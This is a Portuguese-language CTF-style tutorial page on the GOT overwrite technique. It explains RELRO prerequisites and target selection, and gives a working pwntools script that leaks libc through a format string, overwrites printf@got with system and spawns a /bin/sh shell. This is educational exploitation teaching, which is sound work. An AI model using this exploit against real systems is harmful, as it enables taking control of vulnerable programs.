---
title: "GOT Overwrite"
sidebar_position: 5
---

A GOT guarda os endereços reais das funções da libc que o binário usa (`puts@got` → `puts` na libc). Ela é gravável com **Partial RELRO** (`pwn checksec`). Se sobrescrevermos `puts@got` com o endereço de `system`, toda chamada `puts(x)` vira `system(x)`.

Pré-requisitos: uma **escrita arbitrária** (format string com `%n`, heap, out-of-bounds) e `Partial RELRO` (ou `No RELRO`). Com `Full RELRO`, a GOT é somente leitura: mire em outra coisa (return address, hooks, `FILE`).

1. Escolha a função a sequestrar: uma que receba **o seu input como primeiro argumento** e seja chamada depois da escrita. Ex: `printf(buffer)` ou `puts(buffer)` → vira `system(buffer)`, e você manda `/bin/sh`
2. Endereço da entrada na GOT: `elf.got['printf']` (ou `objdump -R ./bin | grep printf`). Precisa de `No PIE`, ou de um leak do binário
3. Endereço do novo valor:
   - Se o binário tem uma função `win`: `elf.sym['win']`
   - Se quer `system` da libc: precisa da base da libc (leak de um endereço da libc com `%p` ou `puts(puts@got)`), depois `libc.address = leak - offset` e `libc.sym['system']`
   - Se o binário já usa `system` em algum lugar: `elf.plt['system']` (não precisa de leak)
4. Escreva. Com format string:

```py
from pwn import *
elf = context.binary = ELF('./vuln')
libc = elf.libc            # ou ELF('./libc.so.6') fornecida pelo desafio
p = process()

# 1) leak da libc (exemplo: o 3º parâmetro era um endereço da libc)
p.sendline(b'%3$p')
leak = int(p.recvline().strip(), 16)
libc.address = leak - 0x1ed6a0          # offset descoberto no GDB: leak - base (vmmap)

# 2) GOT overwrite: printf@got = system
offset = 6                              # posição do buffer nos parâmetros do printf
p.sendline(fmtstr_payload(offset, {elf.got['printf']: libc.sym['system']}))

# 3) o próximo printf(buffer) é system(buffer)
p.sendline(b'/bin/sh')
p.interactive()
```

Dicas:

- Precisa que o `printf` vulnerável rode pelo menos 3 vezes (leak, escrita, shell). Programas com loop são o caso típico. Se rodar só 2 vezes, pule o leak: aponte para `win` ou para `elf.plt['system']`, ou escreva `main` em `exit@got`/`__stack_chk_fail@got` para ganhar mais rodadas
- Em x86 (32 bits), `fmtstr_payload` funciona igual, com endereços de 4 bytes
- Para confirmar que deu certo: no GDB, `x/gx &'printf@got.plt'` (ou `got` no pwndbg) antes e depois da escrita
- Outro alvo útil quando o programa termina com `exit()`: sobrescrever `exit@got` com `main` (loop infinito) ou com `win`
